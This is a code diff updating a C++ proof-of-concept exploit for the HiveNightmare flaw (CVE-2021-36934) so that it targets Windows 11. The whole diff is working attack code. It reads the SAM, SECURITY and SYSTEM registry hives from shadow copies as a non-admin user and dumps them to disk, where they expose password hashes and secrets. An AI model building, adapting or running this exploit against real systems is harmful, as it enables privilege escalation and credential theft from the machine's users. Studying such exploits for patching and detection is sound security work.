@@ -1,21 +1,26 @@
-// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
-// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users
-
-// History
-// 0.1 - 20/07/2021 - Initial version
-// 0.2 - 20/07/2021 - Adds support for 4 snapshots
-// 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
-// 0.4 - 21/07/2021 - better code shocker :O
-// 0.5 - 21/07/2021 - favour retrieving hives from latest snapshot, UTF-16 support, bump to 15 snapshots
-// 0.6 - 26/07/2021 - close file handle to avoid being a dummy
+// HiveNightmare exploit, adjusted for Windows 11 (CVE-2021-36934)
+// Note: This vulnerability is patched in recent Windows 10/11 builds.
+// This PoC may only work on unpatched or vulnerable systems with accessible shadow copies.
 
 #include <windows.h>
 #include <io.h>
 #include <fcntl.h>
 #include <iostream>
+#include <VersionHelpers.h> // For OS version checks
 
 using std::endl;
 using std::wcout;
+
+#define MAX_VSS_SEARCH 50 // Increase max search for Windows 11 environments
+
+void printLastError(const wchar_t* msg) {
+    DWORD err = GetLastError();
+    LPWSTR errMsg = NULL;
+    FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+        NULL, err, 0, (LPWSTR)&errMsg, 0, NULL);
+    wcout << msg << L" (Error " << err << L"): " << (errMsg ? errMsg : L"Unknown") << endl;
+    if (errMsg) LocalFree(errMsg);
+}
 
 HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
     HANDLE hfile;
@@ -35,6 +40,7 @@ HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
         if (hfile != INVALID_HANDLE_VALUE) {
             if (GetFileTime(hfile, &creationTime, &lastAccessTime, &lastWriteTime)) {
                 if (CompareFileTime(&youngest, &lastWriteTime) < 0) {
+                    if (retHandle != INVALID_HANDLE_VALUE) CloseHandle(retHandle);
                     retHandle = hfile;
                     youngest = lastWriteTime;
                     wcout << "Newer file found: " << fullPath << endl;
@@ -56,7 +62,7 @@ void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
 
     if (hAppend == INVALID_HANDLE_VALUE)
     {
-        printf("Could not write %ls - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", dest);
+        printLastError(L"Could not write to output file");
         return;
     }
 
@@ -68,7 +74,6 @@ void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
         WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
         UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
     }
-
     CloseHandle(hAppend);
 }
 
@@ -85,27 +90,29 @@ bool getFileTime(HANDLE handle, LPTSTR buf, int buflen) {
     }
     FileTimeToSystemTime(&lastWriteTime, &st);
     GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, L"yyyy-MM-dd", buf, buflen);
-    
+
     return true;
 }
 
-
-
 int main(int argc, char* argv[])
 {
-    int searchDepth;
+    int searchDepth = MAX_VSS_SEARCH;
     _setmode(_fileno(stdout), _O_U16TEXT);
+
+    // OS version check (optional but informative)
+    if (!IsWindows10OrGreater()) {
+        wcout << L"Warning: This exploit is designed for Windows 10/11 systems." << endl;
+    }
+
     if (argc > 1) {
         if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
-            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default 15)]\n\n";
+            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default " << MAX_VSS_SEARCH << L")]\n\n";
             return -1;
         }
     }
-    else {
-        searchDepth = 15;
-    }
 
-    wcout << L"\nHiveNightmare v0.6 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
+    wcout << L"\nHiveNightmare v0.6 (Windows 11 adjusted) - dump registry hives as non-admin users\n\n";
+    wcout << L"Specify maximum number of shadows to inspect with parameter if wanted, default is " << MAX_VSS_SEARCH << L".\n\nRunning...\n\n";
 
     HANDLE hFile;
 
@@ -113,50 +120,29 @@ int main(int argc, char* argv[])
     TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
     TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
     TCHAR fileTime[200];
-    TCHAR fileName[20];
+    TCHAR fileName[40];
 
-    hFile = getVssFileHandle(samLocation, searchDepth);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        wcout << "Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
-        return -1;
-    }
-    else {
+    // Try to dump each hive
+    struct { TCHAR* path; wchar_t* prefix; } hives[] = {
+        { samLocation, L"SAM" }, { securityLocation, L"SECURITY" }, { systemLocation, L"SYSTEM" }
+    };
+
+    for (auto& hive : hives) {
+        hFile = getVssFileHandle(hive.path, searchDepth);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            wcout << L"Could not open " << hive.prefix << L" :( Is System Protection enabled or vulnerability fixed? Try increasing number of VSS snapshots to search - list with 'vssadmin list shadows'" << endl;
+            printLastError(L"Last error");
+            continue;
+        }
         getFileTime(hFile, fileTime, 200);
-        swprintf_s(fileName, L"SAM-%s", fileTime); //buggy if name too long
+        swprintf_s(fileName, 40, L"%s-%s", hive.prefix, fileTime);
         dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        wcout << endl << L"Success: SAM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
-    }
-    
-
-    hFile = getVssFileHandle(securityLocation, searchDepth);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        wcout << "Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
-        return -1;
-    }
-    else {
-        getFileTime(hFile, fileTime, 200);
-        swprintf_s(fileName, L"SECURITY-%s", fileTime);
-        dumpHandleToFile(hFile, fileName);
-        CloseHandle(hFile);
-        wcout << endl << L"Success: SECURITY hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
-    }
-    
-
-    hFile = getVssFileHandle(systemLocation, searchDepth);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        wcout << "Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
-        return -1;
-    }
-    else {
-        getFileTime(hFile, fileTime, 200);
-        swprintf_s(fileName, L"SYSTEM-%s", fileTime);
-        dumpHandleToFile(hFile, fileName);
-        CloseHandle(hFile);
-        wcout << endl << L"Success: SYSTEM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
+        wcout << endl << L"Success: " << hive.prefix << L" hive from " << fileTime << L" written out as " << fileName << endl << endl;
     }
 
-    wcout << endl << L"Assuming no errors above, you should be able to find hive dump files in current working directory." << endl;
+    wcout << endl << L"Assuming no errors above, you should find hive dump files in the current working directory." << endl;
+    wcout << L"If this fails on Windows 11, the vulnerability is likely patched (see CVE-2021-36934)." << endl;
 
     return 0;
 }
